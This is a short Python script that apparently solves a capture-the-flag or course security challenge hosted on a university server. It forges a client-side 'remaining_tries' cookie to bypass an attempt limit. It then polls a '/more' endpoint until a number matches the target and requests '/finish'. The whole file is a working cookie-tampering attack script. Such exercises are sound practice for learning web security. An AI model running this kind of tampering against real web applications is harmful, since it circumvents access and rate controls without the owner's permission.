import requests
import re

while(True):
    s = requests.Session()
    req = s.get('http://mustard.stt.rnl.tecnico.ulisboa.pt:22054')
    user = s.cookies['user']

    req = s.get('http://mustard.stt.rnl.tecnico.ulisboa.pt:22054', cookies = {'remaining_tries': '9000', 'user': user})
    target = int(re.findall(r'[0-9]+', req.text)[0])
    print('Target: ' + str(target))
    finished = False

    while(True):
        req = s.get('http://mustard.stt.rnl.tecnico.ulisboa.pt:22054/more', cookies = {'remaining_tries': '9000', 'user': user})
        if(len(re.findall(r'[0-9]+', req.text)) == 3):
            total = int(re.findall(r'[0-9]+', req.text)[2])
        else:
            total = int(re.findall(r'[0-9]+', req.text)[1])

        print('Total: ' + str(total))

        if(total == target):
            print(s.get('http://mustard.stt.rnl.tecnico.ulisboa.pt:22054/finish').text)
            finished = True
            break
        else:
            continue
            
    if(finished):
        break    
    
    
